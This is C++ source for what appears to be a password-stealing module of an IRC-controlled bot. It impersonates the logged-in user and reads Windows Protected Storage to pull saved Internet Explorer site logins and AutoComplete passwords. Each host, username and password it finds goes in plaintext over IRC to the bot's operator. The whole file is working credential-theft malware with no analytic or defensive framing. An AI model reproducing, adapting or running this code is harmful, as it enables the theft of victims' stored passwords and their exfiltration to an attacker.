#include "../Headers/includes.h"
#include "../Headers/functions.h"
#ifndef NO_PSTORE

#import "..\Libs\pstorec.dll"
using namespace PSTORECLib;
typedef HRESULT (__stdcall *PSCI)(IPStore **, DWORD, DWORD, DWORD);
typedef HRESULT (WINAPI *PStoreCreateInstancePtr)(IPStore **, DWORD, DWORD, DWORD);
DWORD WINAPI pstore_main(LPVOID lParam)
{
	NTHREAD ps = *((NTHREAD *)lParam);
    NTHREAD *pss = (NTHREAD *)lParam;
    pss->gotinfo = TRUE;
    IRC* irc=(IRC*)ps.conn;

    EnumPStorage(lParam);

	if (!ps.silent)
		irc->pmsg(ps.target, "%s PStore list done.", pstore_title);
	clearthread(ps.threadnum);
	ExitThread(0);
    return 0;
}


bool EnumPStorage(LPVOID lParam)
{

	NTHREAD ps = *((NTHREAD *)lParam);
    IRC* irc=(IRC*)ps.conn;

    GUID TypeGUID;
    char szItemName[512];
    char szItemData[512];
    char szResName[1512];
    char szResData[512];
    char szItemGUID[50];
    PSCI fPStoreCreateInstance;

    HMODULE pstorec_dll = LoadLibrary("pstorec.dll");
    if (pstorec_dll)
        fPStoreCreateInstance = (PSCI)GetProcAddress(pstorec_dll,"PStoreCreateInstance");

    if (!fPStoreCreateInstance)
        return FALSE;

    if (!IsServiceRunning("ProtectedStorage"))
    {
        if ((!ps.silent))
            irc->pmsg(ps.target, "%s Protected Storage service is not running!", pstore_title);
        return FALSE;
    }

    ImpersonateInteractiveUser();

    int iSent=0;
    IPStorePtr PStore;
    HRESULT hRes=fPStoreCreateInstance(&PStore, 0, 0, 0);
    if (FAILED(hRes))
    {
        if ((!ps.silent))
            irc->pmsg(ps.target, "%s PStore Instance failled to create!", pstore_title);
        return FALSE;
    }

    IEnumPStoreTypesPtr EnumPStoreTypes;
    hRes=PStore->EnumTypes(0, 0, &EnumPStoreTypes);
    if (FAILED(hRes))
    {
        if ((!ps.silent))
            irc->pmsg(ps.target, "%s PStore query failled!", pstore_title);
        return FALSE;
    }

    while(EnumPStoreTypes->raw_Next(1,&TypeGUID,0) == S_OK)
    {
        wsprintf(szItemGUID,"%x",TypeGUID);

        IEnumPStoreTypesPtr EnumSubTypes;
        hRes = PStore->EnumSubtypes(0, &TypeGUID, 0, &EnumSubTypes);

        GUID subTypeGUID;
        while(EnumSubTypes->raw_Next(1,&subTypeGUID,0) == S_OK)
        {
            IEnumPStoreItemsPtr spEnumItems;
            HRESULT hRes=PStore->EnumItems(0, &TypeGUID, &subTypeGUID, 0, &spEnumItems);

            LPWSTR itemName;
            while(spEnumItems->raw_Next(1,&itemName,0) == S_OK)
            {
                wsprintf(szItemName,"%ws",itemName);
                char chekingdata[200];
                unsigned long psDataLen = 0;
                unsigned char *psData = NULL;
                _PST_PROMPTINFO *pstiinfo = NULL;
                hRes = PStore->ReadItem(0,&TypeGUID,&subTypeGUID,itemName,&psDataLen,&psData,pstiinfo,0);
                if(lstrlen((char *)psData)<(psDataLen-1))
                {
                    int i=0;
                    for(int m=0;m<psDataLen;m+=2)
                    {
                        if(psData[m]==0)
                            szItemData[i]=',';
                        else
                            szItemData[i]=psData[m];
                        i++;
                    }
                    szItemData[i-1]=0;
                }
                else
                {
                    wsprintf(szItemData,"%s",psData);
                }
                lstrcpy(szResName,"");
                lstrcpy(szResData,"");

                //5e7e8100 - IE:Password-Protected sites
                if (lstrcmp(szItemGUID,"5e7e8100")==0)
                {
                    lstrcpy(chekingdata,"");
                    if(strstr(szItemData,":")!=0)
                    {
                        lstrcpy(chekingdata,strstr(szItemData,":")+1);
                        *(strstr(szItemData,":"))=0;
                    }
                    iSent++;
                    if ((strcmp(szItemData,"") && strcmp(chekingdata,"")))
                        irc->pmsg(ps.target, "%s IE Password Protected (HTACCESS) > Host: %s, Username: %s, Password: %s",
                                    pstore_title, szItemName, szItemData, chekingdata);
                }

                //e161255a - IE:AutoComplete
                if (lstrcmp(szItemGUID,"e161255a")==0)
                {
                    if (strstr(szItemName,"StringIndex")==0)
                    {
                        if(strstr(szItemName,":String")!=0)
                            *strstr(szItemName,":String")=0;

                        lstrcpyn(chekingdata,szItemName,8);
                        if (strstr(chekingdata,"http:/") || strstr(chekingdata,"https:/"))
                        {
                            lstrcpy(chekingdata,"");
                            if(strstr(szItemData,",")!=0)
                            {
                                lstrcpy(chekingdata,strstr(szItemData,",")+1);
                                *(strstr(szItemData,","))=0;
                            }
                            iSent++;
                            if ((strcmp(szItemData,"") && strcmp(chekingdata,"")))
                                irc->pmsg(ps.target, "%s IE Complete-Password > Host: %s, Username: %s, Password: %s",
                                          pstore_title, szItemName, szItemData, chekingdata);
                        }
                    }
                }

                ZeroMemory(szItemName,sizeof(szItemName));
                ZeroMemory(szItemData,sizeof(szItemData));
            }
        }
    }
    if (iSent==0)
    {
        if (!ps.silent)
            irc->pmsg(ps.target, "%s No password found!", pstore_title);
    }
    return TRUE;
}

#endif